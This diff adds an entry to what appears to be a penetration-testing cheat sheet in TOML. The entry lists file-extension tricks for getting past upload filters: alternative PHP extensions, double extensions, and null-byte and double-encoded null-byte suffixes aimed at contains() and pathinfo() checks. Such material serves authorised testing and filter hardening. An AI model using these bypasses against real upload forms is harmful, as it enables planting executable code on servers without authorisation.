@@ -1,0 +1,20 @@
+title = "File upload extension bypass"
+description = "Modify the file extension and bypass filters on file uploads"
+tags = ["web", "upload", "RCE", "bypass"]
+
+[[data]]
+description = "Alternative PHP extensions:"
+command = """.php, .phtml, .php3, .php4, .php5, .php7, .phps, .php-s, .pht, .phar, .inc"""
+
+[[data]]
+description = "Bypass contains():"
+command = """.jpg.php, .jpg.php5, .jpg.phtml"""
+
+[[data]]
+description = "Bypass pathinfo():"
+command = """.php%00.jpg, .php5%00.jpg"""
+
+[[data]]
+description = "Bypass pathinfo() [double encoding]:"
+command = """.php%2500.jpg, .php5%2500.jpg"""
+
